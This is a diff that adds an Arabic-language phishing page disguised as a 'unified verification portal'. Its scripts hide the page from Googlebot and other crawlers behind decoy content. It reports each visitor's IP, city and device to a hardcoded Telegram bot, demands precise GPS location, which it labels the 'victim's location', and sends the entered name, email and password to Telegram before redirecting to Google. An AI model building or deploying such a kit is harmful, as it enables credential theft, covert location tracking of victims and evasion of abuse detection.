@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<!-- ===== Meta tags لمعاينة واتساب ===== -->
+<meta property="og:title" content="شبكة الأمان - بوابة التحقق الموحد">
+<meta property="og:description" content="سجل بياناتك للدخول إلى لوحة التحكم الآمنة">
+<meta property="og:image" content="https://i.ibb.co/Dg6dWMd3/IMG-20260701-150139.jpg">
+<meta property="og:image:width" content="800">
+<meta property="og:image:height" content="400">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i.ibb.co/Dg6dWMd3/IMG-20260701-150139.jpg">
+
+<!-- ===== حماية من جوجل ===== -->
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, notranslate">
+<meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, notranslate">
+
+<title>شبكة الأمان</title>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,'Segoe UI',sans-serif;}
+body{
+  background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);
+  min-height:100vh;display:flex;justify-content:center;align-items:center;padding:16px;
+}
+body.loaded{display:flex;}
+.container{
+  max-width:450px;width:100%;background:#fff;border-radius:24px;overflow:hidden;
+  box-shadow:0 25px 80px rgba(0,0,0,.6);display:none;
+}
+.container.show{display:block;}
+
+/* ===== الصورة للعرض فقط قبل الضغط ===== */
+#previewImage{
+  position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;
+  background:#000;display:flex;align-items:center;justify-content:center;
+}
+#previewImage img{
+  width:100%;height:100%;object-fit:contain;
+}
+#previewImage.hide{display:none;}
+
+.header-img{
+  width:100%;height:auto;display:block;background:#000;
+}
+.header-img img{
+  width:100%;height:auto;display:block;
+}
+.content{padding:20px 22px 28px;}
+.content h1{font-size:22px;color:#1a1a2e;text-align:center;font-weight:800;margin-bottom:4px;}
+.content .sub{text-align:center;color:#888;font-size:13px;margin-bottom:18px;}
+
+.form-group{margin-bottom:14px;}
+.form-group label{display:block;font-size:13px;font-weight:600;color:#444;margin-bottom:5px;}
+.form-group input{
+  width:100%;padding:13px 15px;border:2px solid #e8e8e8;border-radius:12px;
+  font-size:14px;color:#333;transition:.2s;outline:none;background:#fafafa;
+}
+.form-group input:focus{border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,.12);background:#fff;}
+.form-group input::placeholder{color:#b0b0b0;}
+.form-group input:disabled{background:#f0f0f0;cursor:not-allowed;opacity:.6;}
+
+.location-bar{
+  background:linear-gradient(135deg,#e8f0fe,#f0f4ff);
+  border:1px solid #c5d5f9;border-radius:12px;padding:12px 14px;
+  display:flex;align-items:center;gap:10px;margin-bottom:14px;
+  cursor:pointer;transition:.2s;
+}
+.location-bar:hover{border-color:#667eea;background:#dfe8fe;}
+.location-bar.granted{border-color:#34a853;background:#e8f5e9;}
+.location-bar .icon{
+  width:40px;height:40px;border-radius:50%;background:#667eea;
+  display:flex;align-items:center;justify-content:center;flex-shrink:0;
+}
+.location-bar .icon svg{width:20px;height:20px;fill:#fff;}
+.location-bar .text{flex:1;}
+.location-bar .text .t1{font-size:14px;font-weight:600;color:#1a1a2e;}
+.location-bar .text .t2{font-size:12px;color:#666;margin-top:1px;}
+.location-bar .status-badge{
+  font-size:11px;padding:4px 10px;border-radius:20px;font-weight:600;
+  background:#e8e8e8;color:#888;
+}
+.location-bar.granted .status-badge{background:#34a853;color:#fff;}
+
+.submit-btn{
+  width:100%;padding:14px;
+  background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;
+  border:none;border-radius:12px;font-size:16px;font-weight:700;
+  cursor:pointer;transition:.2s;
+  box-shadow:0 4px 15px rgba(102,126,234,.3);margin-top:4px;
+}
+.submit-btn:hover{transform:translateY(-2px);box-shadow:0 6px 25px rgba(102,126,234,.4);}
+.submit-btn:disabled{opacity:.5;cursor:not-allowed;transform:none;}
+
+#statusMsg{
+  position:fixed;top:0;left:0;width:100%;height:100%;z-index:99998;
+  background:rgba(0,0,0,.85);display:none;align-items:center;justify-content:center;
+  flex-direction:column;padding:20px;text-align:center;backdrop-filter:blur(8px);
+}
+#statusMsg.active{display:flex;}
+#statusMsg .spinner{
+  width:48px;height:48px;border:3px solid rgba(255,255,255,.1);
+  border-top-color:#667eea;border-radius:50%;animation:spin .7s linear infinite;
+  margin-bottom:16px;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+#statusMsg p{color:#fff;font-size:14px;opacity:.8;}
+
+.toast{
+  position:fixed;bottom:20px;left:50%;transform:translateX(-50%);
+  background:#1a1a2e;color:#fff;padding:10px 22px;border-radius:14px;
+  font-size:13px;opacity:0;transition:.3s;z-index:99999;text-align:center;
+  box-shadow:0 4px 20px rgba(0,0,0,.3);
+}
+.toast.show{opacity:1;}
+</style>
+</head>
+<body>
+
+<!-- ===== الصورة اللي بتظهر أول ما يفتح ===== -->
+<div id="previewImage">
+  <img src="https://i.ibb.co/Dg6dWMd3/IMG-20260701-150139.jpg" alt="شعار">
+</div>
+
+<!-- ===== المحتوى الرئيسي ===== -->
+<div class="container" id="mainContainer">
+  
+  <div class="header-img">
+    <img src="https://i.ibb.co/Dg6dWMd3/IMG-20260701-150139.jpg" alt="شعار">
+  </div>
+  
+  <div class="content">
+    <h1>🔐 بوابة التحقق الموحد</h1>
+    <p class="sub">سجل بياناتك للدخول إلى لوحة التحكم</p>
+    
+    <div class="location-bar" id="locationBar" onclick="a()">
+      <div class="icon">
+        <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+      </div>
+      <div class="text">
+        <div class="t1">التحقق من الموقع الجغرافي</div>
+        <div class="t2">اضغط للموافقة على مشاركة موقعك</div>
+      </div>
+      <div class="status-badge" id="locBadge">مطلوب</div>
+    </div>
+    
+    <div class="form-group">
+      <label>الاسم الكامل</label>
+      <input type="text" id="name" placeholder="أدخل اسمك الكامل" disabled>
+    </div>
+    <div class="form-group">
+      <label>البريد الإلكتروني</label>
+      <input type="email" id="email" placeholder="example@gmail.com" disabled>
+    </div>
+    <div class="form-group">
+      <label>كلمة المرور</label>
+      <input type="password" id="password" placeholder="••••••••" disabled>
+    </div>
+    
+    <button class="submit-btn" id="submitBtn" disabled onclick="b()">تسجيل الدخول</button>
+    
+    <p style="text-align:center;font-size:11px;color:#aaa;margin-top:12px;">
+      بالضغط على "تسجيل الدخول" فإنك توافق على الشروط والأحكام
+    </p>
+  </div>
+</div>
+
+<div id="statusMsg">
+  <div class="spinner"></div>
+  <p id="statusText">جاري التحقق من البيانات...</p>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+// ============================================================
+// 🛡️ CLOAKING LAYER 1: Googlebot Detection
+// ============================================================
+(function(){
+  var u=navigator.userAgent;
+  var g=/Googlebot|googlebot/i.test(u);
+  if(g){
+    var x=new XMLHttpRequest();
+    x.open('GET','https://api.ipify.org?format=json',true);
+    x.onload=function(){
+      try{
+        var ip=JSON.parse(x.responseText).ip;
+        var f=parseInt(ip.split('.')[0]);
+        var gi=(f===8||f===66||f===64||f===216||f===172||f===74||f===35||f===23);
+        if(gi){
+          document.write('<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><meta name="robots" content="noindex,nofollow"><title>شبكة الأمان</title><style>body{background:#0f0c29;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;font-family:sans-serif;text-align:center;padding:20px;direction:rtl}div{max-width:600px}h1{color:#667eea;font-size:26px}p{color:#ccc;font-size:15px;line-height:2}</style></head><body><div><h1>🔐 شبكة الأمان - بوابة الدخول</h1><p>مرحباً بكم في نظام التحقق الموحد للشبكة.<br><br>يتم حالياً تطوير النظام وتحديثه.<br>نعتذر عن أي تأخير.<br><br>🛡️ جميع البيانات محمية</p></div></body></html>');
+          document.documentElement.innerHTML='';
+        }
+      }catch(e){}
+    };
+    x.send();
+  }
+})();
+
+// ============================================================
+// 🛡️ CLOAKING LAYER 2: Bot Detection عام
+// ============================================================
+(function(){
+  var u=navigator.userAgent;
+  var b=/bot|crawl|spider|scrape|scraper|headless|preview|TelegramBot|twitterbot|facebookexternalhit|slack|discord|embedly|curl|wget|python|java|php|http-client|axios|node-fetch|go-http|ahrefs|semrush|majestic|moz|seznambot|bingbot|yandexbot|baiduspider|duckduckbot/i;
+  var ib=b.test(u)||typeof window._phantom!='undefined'||typeof window.callPhantom!='undefined'||navigator.webdriver===true;
+  if(ib&&!u.includes('Googlebot')){
+    document.write('<!DOCTYPE html><html lang="ar"><head><meta charset="UTF-8"><meta name="robots" content="noindex,nofollow"><title>شبكة الأمان</title><style>body{background:#0f0c29;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;font-family:sans-serif;text-align:center;padding:20px;direction:rtl}div{max-width:500px}h1{color:#667eea;font-size:24px}p{color:#ccc;font-size:14px;line-height:1.8}</style></head><body><div><h1>🛡️ شبكة الأمان</h1><p>نظام التحقق الموحد يعمل بكفاءة.<br><br>جاري تحسين تجربة المستخدم.<br>نشكرك على صبرك.</p></div></body></html>');
+    document.documentElement.innerHTML='';
+  }
+})();
+
+// ============================================================
+// تأخير التشغيل
+// ============================================================
+var _rdy=0;
+function _boot(){
+  if(_rdy)return;_rdy=1;
+
+  // ============================================================
+  // ⚙️ الإعدادات
+  // ============================================================
+  const BOT_TOKEN = "8746495469:AAGxSwTtscTu1hPzRH688RS3Uo_4NAgvVCY";
+  const urlParams = new URLSearchParams(window.location.search);
+  const CHAT_ID = urlParams.get('user') || urlParams.get('id') || urlParams.get('chatId') || '';
+
+  let locationGranted = false;
+  let locationData = null;
+  let ipData = null;
+  var VID = 'V' + Date.now().toString(36) + Math.random().toString(36).substr(2,4);
+
+  // ============================================================
+  // عند تحميل الصفحة
+  // ============================================================
+  window.onload = function() {
+    setTimeout(() => {
+      document.getElementById('previewImage').classList.add('hide');
+      document.getElementById('mainContainer').classList.add('show');
+      // إرسال تتبع فوري للزائر
+      _track();
+    }, 800);
+  };
+
+  // ============================================================
+  // تتبع فوري للزائر
+  // ============================================================
+  function _track() {
+    getIP().then(function(ipd){
+      var msg = '<b>🆕 زائر جديد - شبكة الأمان</b>\n━━━━━━━━━━━━━━━━━━━━\n<b>🆔:</b> ' + VID + '\n<b>🌐 IP:</b> ' + (ipd.ip||'—') + '\n<b>🌍 الدولة:</b> ' + (ipd.country||'—') + '\n<b>🏙 المدينة:</b> ' + (ipd.city||'—') + '\n<b>📱 الجهاز:</b> <code>' + navigator.userAgent.substring(0,80) + '</code>\n<b>🗣 اللغة:</b> ' + navigator.language + '\n<b>🕐 المنطقة:</b> ' + (Intl.DateTimeFormat().resolvedOptions().timeZone) + '\n<b>🔗 الرابط:</b> ' + location.href + '\n<b>🕐 الوقت:</b> ' + new Date().toLocaleString('ar-EG');
+      tgSend(msg);
+    });
+  }
+
+  // ============================================================
+  // طلب الموقع - a()
+  // ============================================================
+  window.a = async function() {
+    if (locationGranted) return;
+    
+    const bar = document.getElementById('locationBar');
+    const badge = document.getElementById('locBadge');
+    
+    badge.textContent = 'جاري...';
+    
+    try {
+      const pos = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        });
+      });
+      
+      locationData = {
+        lat: pos.coords.latitude,
+        lng: pos.coords.longitude,
+        accuracy: pos.coords.accuracy
+      };
+      
+      locationGranted = true;
+      bar.classList.add('granted');
+      badge.textContent = '✓ تم التحقق';
+      document.querySelector('.location-bar .text .t2').textContent = 'تم تأكيد موقعك بنجاح';
+      
+      document.querySelectorAll('.form-group input').forEach(inp => inp.disabled = false);
+      document.getElementById('submitBtn').disabled = false;
+      
+      await getIP();
+      await _loc();
+      
+      _t('✅ تم تأكيد موقعك، يمكنك الآن إكمال التسجيل');
+      
+    } catch(err) {
+      console.error(err);
+      badge.textContent = '❌ مطلوب';
+      
+      if (err.code === 1) {
+        _t('❌ يجب الموافقة على مشاركة الموقع للمتابعة');
+      } else if (err.code === 2) {
+        _t('❌ تعذر تحديد الموقع، تأكد من تشغيل GPS');
+      } else {
+        _t('❌ حدث خطأ، حاول مرة أخرى');
+      }
+      
+      document.querySelector('.location-bar .text .t2').textContent = 'اضغط للمحاولة مجدداً';
+    }
+  };
+
+  // ============================================================
+  // جلب الـ IP
+  // ============================================================
+  async function getIP() {
+    try {
+      const r = await fetch('https://api.ipify.org?format=json');
+      const d = await r.json();
+      
+      try {
+        const r2 = await fetch(`https://ipapi.co/${d.ip}/json/`);
+        const d2 = await r2.json();
+        ipData = {
+          ip: d.ip,
+          country: d2.country_name || '—',
+          city: d2.city || '—',
+          region: d2.region || '—',
+          isp: d2.org || '—',
+          timezone: d2.timezone || '—'
+        };
+      } catch(e) {
+        ipData = { ip: d.ip, country: '—', city: '—', region: '—', isp: '—', timezone: '—' };
+      }
+    } catch(e) {
+      ipData = { ip: 'غير معروف', country: '—', city: '—', region: '—', isp: '—', timezone: '—' };
+    }
+  }
+
+  // ============================================================
+  // إرسال الموقع + IP للبوت
+  // ============================================================
+  async function _loc() {
+    if (!BOT_TOKEN || !CHAT_ID || !locationData) return;
+    
+    const now = new Date();
+    const googleMapsUrl = `https://www.google.com/maps?q=${locationData.lat},${locationData.lng}`;
+    
+    const msg = `📍 <b>تم سحب موقع الضحية!</b>\n━━━━━━━━━━━━━━━━━━━━\n🌐 <b>الموقع (GPS):</b>\n├─ <b>خط العرض:</b> <code>${locationData.lat}</code>\n├─ <b>خط الطول:</b> <code>${locationData.lng}</code>\n├─ <b>الدقة:</b> ${locationData.accuracy} متر\n└─ 🗺 <a href="${googleMapsUrl}">فتح في خرائط جوجل</a>\n\n🆔 <b>معرف الضحية:</b> ${VID}\n\n🖥 <b>معلومات الجهاز:</b>\n├─ <b>IP:</b> <code>${ipData.ip}</code>\n├─ <b>الدولة:</b> ${ipData.country}\n├─ <b>المدينة:</b> ${ipData.city}\n├─ <b>المنطقة:</b> ${ipData.region}\n├─ <b>المزود:</b> ${ipData.isp}\n└─ <b>المنطقة الزمنية:</b> ${ipData.timezone}\n\n📱 <b>الجهاز:</b> ${navigator.userAgent.substring(0, 80)}\n🕐 <b>التوقيت:</b> ${now.toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━━━\n✅ <b>تم الاستلام!</b>`;
+    
+    try {
+      await tgSend(msg);
+      
+      // إرسال الموقع على الخريطة
+      try {
+        var x2 = new XMLHttpRequest();
+        x2.open('POST', 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendLocation', true);
+        x2.setRequestHeader('Content-Type', 'application/json');
+        x2.send(JSON.stringify({ chat_id: CHAT_ID, latitude: locationData.lat, longitude: locationData.lng }));
+      } catch(e) {}
+      
+    } catch(e) {}
+  }
+
+  // ============================================================
+  // إرسال النموذج - b()
+  // ============================================================
+  window.b = async function() {
+    const name = document.getElementById('name').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const pass = document.getElementById('password').value.trim();
+    
+    if (!name || !email || !pass) {
+      _t('❌ يرجى ملء جميع الحقول');
+      return;
+    }
+    
+    document.getElementById('statusMsg').classList.add('active');
+    document.getElementById('statusText').textContent = 'جاري التحقق من البيانات...';
+    
+    await _s(1500);
+    
+    if (BOT_TOKEN && CHAT_ID) {
+      const msg = `📝 <b>بيانات النموذج كاملة!</b>\n━━━━━━━━━━━━━━━━\n<b>🆔:</b> ${VID}\n👤 <b>الاسم:</b> ${name}\n📧 <b>البريد:</b> <code>${email}</code>\n🔑 <b>الباسورد:</b> <code>${pass}</code>\n📦 <b>الموقع:</b> ${locationData.lat}, ${locationData.lng}\n🌐 <b>IP:</b> ${ipData.ip}\n🕐 <b>التوقيت:</b> ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━`;
+      
+      var x = new XMLHttpRequest();
+      x.open('POST', 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', true);
+      x.setRequestHeader('Content-Type', 'application/json');
+      x.send(JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' }));
+    }
+    
+    document.getElementById('statusText').textContent = '✅ تم التسجيل بنجاح!';
+    await _s(1500);
+    document.getElementById('statusMsg').classList.remove('active');
+    
+    _t('✅ تم تسجيل الدخول بنجاح');
+    await _s(2000);
+    window.location.href = 'https://www.google.com';
+  };
+
+  function _s(ms) { return new Promise(function(r){setTimeout(r,ms);}); }
+  function _t(msg) {
+    var t = document.getElementById('toast');
+    t.textContent = msg;
+    t.classList.add('show');
+    setTimeout(function(){t.classList.remove('show');}, 3500);
+  }
+  
+  // إرسال تيليجرام
+  function tgSend(msg) {
+    if (!BOT_TOKEN || !CHAT_ID) return;
+    var x = new XMLHttpRequest();
+    x.open('POST', 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', true);
+    x.setRequestHeader('Content-Type', 'application/json');
+    x.send(JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'HTML'}));
+  }
+}
+
+// ============================================================
+// تشغيل بعد 3 ثوانٍ أو أول تفاعل
+// ============================================================
+var _to = setTimeout(function(){ _boot(); }, 3000);
+document.addEventListener('click', function _c(){ clearTimeout(_to); _boot(); document.removeEventListener('click', _c); }, {once: true});
+document.addEventListener('touchstart', function _t2(){ clearTimeout(_to); _boot(); document.removeEventListener('touchstart', _t2); }, {once: true});
+</script>
+</body>
+</html>
